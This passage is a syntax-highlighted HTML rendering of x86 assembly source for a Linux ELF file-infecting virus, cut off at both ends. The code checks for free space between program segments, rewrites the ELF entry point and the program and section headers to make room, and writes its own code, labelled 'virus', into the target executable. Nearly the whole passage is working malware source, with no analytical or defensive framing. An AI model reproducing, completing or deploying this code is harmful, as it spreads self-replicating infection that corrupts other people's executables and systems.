    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-28]=e_phnum</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x30</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-32]=e_shnum</span><span class="sc0">
    
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  
    </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc1">;end read_ehdr</span><span class="sc0">

    </span><span class="sc5">is_suitable_space</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;look if there is space between end of section 2 and begin of 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr to mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;e_phoff</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;ph[0]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ph[3].p_vaddr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ph[2].p_filesz </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;;;;;[esp+STACK2-36]=ph[2].p_filesz</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ph[2].p_vaddr  </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;ph[3].p_vaddr-ph[2].p_vaddr-ph[2].p_filesz</span><span class="sc0">
    </span><span class="sc1">;verify ecx &gt; VIRUS_SIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">error_suitable</span><span class="sc0"> </span><span class="sc1">;exit    ;;there is not space to write virus</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string10</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc1">;---------here I look it I have more than 3 ph, else file is not</span><span class="sc0">
    </span><span class="sc1">;_________compiled with gcc, but for example with ld (and I assume </span><span class="sc0">
    </span><span class="sc1">;_________ph[2] is the text section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;e_phnum</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">error_suitable</span><span class="sc0">
    </span><span class="sc1">;end is_suitable_space</span><span class="sc0">
</span><span class="sc1">;end is_suitable</span><span class="sc0">

</span><span class="sc5">patch_ehdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">patch_e_entry</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">;the new e_entry will be where the code section finish</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0x08048000</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ebx&lt;-new entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ptr mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x18</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;fix entry</span><span class="sc0">
    </span><span class="sc1">;end patch_e_entry</span><span class="sc0">

    </span><span class="sc5">patch_e_sh_offset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">  
    </span><span class="sc1">;end patch_e_sh_offset</span><span class="sc0">

</span><span class="sc5">patch_phdrs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;;debug</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0"> </span><span class="sc1">;;debug</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;e_phnum</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;e_phoff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr to mapped</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;ph[0]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset</span><span class="sc0">

    </span><span class="sc5">l_read_ph</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;.text ph</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dont_patch_phtext</span><span class="sc0">
    </span><span class="sc1">;here patch .text ph </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc1">;patch p_filesz</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc1">;patch p_memsz</span><span class="sc0">
    </span><span class="sc5">dont_patch_phtext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;if offset &lt;= insertion_offset patch -&gt;jg dont...</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">dont_patch_ph</span><span class="sc0">
    </span><span class="sc1">;here patch phs at offset &gt;= insertion_offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc1">;patch p_offset</span><span class="sc0">
    </span><span class="sc5">dont_patch_ph</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string11</span><span class="sc0"> </span><span class="sc1">;p_offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string9</span><span class="sc0"> </span><span class="sc1">;p_filesz</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string13</span><span class="sc0"> </span><span class="sc1">;p_memsz</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0x20</span><span class="sc0"> </span><span class="sc1">;next ph</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_read_ph</span><span class="sc0">
</span><span class="sc1">;end patch_phdrs</span><span class="sc0">


</span><span class="sc5">patch_shdrs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;e_shnum (loop counter)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;e_shoff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr mapped</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;sh[0]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset</span><span class="sc0">
    </span><span class="sc5">l_read_sh</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;sh_offset ;;;;;;;;;;;;patch .text</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;sh_size</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;sh.sh_offset+sh.sh_size-insertion_size</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dont_patch_shtext</span><span class="sc0"> 
    </span><span class="sc1">;patch .text</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">  </span><span class="sc1">;patch sh_size</span><span class="sc0">
    </span><span class="sc5">dont_patch_shtext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;sh_offset &lt; insertion_offset -&gt; don't patch </span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">dont_patch_sh</span><span class="sc0">
        </span><span class="sc1">;patch sh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">  </span><span class="sc1">;patch sh_offset</span><span class="sc0">
    </span><span class="sc5">dont_patch_sh</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string15</span><span class="sc0"> </span><span class="sc1">;sh_offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string16</span><span class="sc0"> </span><span class="sc1">;sh_size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">  </span><span class="sc1">;next sh </span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_read_sh</span><span class="sc0"> 
</span><span class="sc1">;end patch_shdrs</span><span class="sc0">

</span><span class="sc5">find_current_entry_point</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;so I'll copy this code into the infected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0x08048018</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;current entry</span><span class="sc0">
     </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string17</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
     </span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc1">;end find_current_entry_point</span><span class="sc0">

</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;open the file for writing</span><span class="sc0">
    </span><span class="sc1">;mov eax,5</span><span class="sc0">
    </span><span class="sc1">;mov ebx,[esp+STACK2-44] ;filename infected</span><span class="sc0">
    </span><span class="sc1">;mov ecx,101q ;write-create-truncate</span><span class="sc0">
    </span><span class="sc1">;mov edx,555q ;read-execute from all</span><span class="sc0">
    </span><span class="sc1">;int 0x80</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;&lt;---old fd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;;;;;;;;;;;;[esp+STACK2-40]=write fd</span><span class="sc0">
    </span><span class="sc1">;write before insertion</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;fd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;mapped</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;;write first before insertion_offset</span><span class="sc0">
    </span><span class="sc1">;write virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;entry point address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">  </span><span class="sc1">;virus length </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;;write the virus at insertion_offset</span><span class="sc0">
    </span><span class="sc1">;perhaps I have written less then VIRUS_SIZE bytes, so I have to</span><span class="sc0">
    </span><span class="sc1">;seek the fd of VIRUS_SIZE more then the insertion_offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;SEEK_SET</span><span class="sc0">
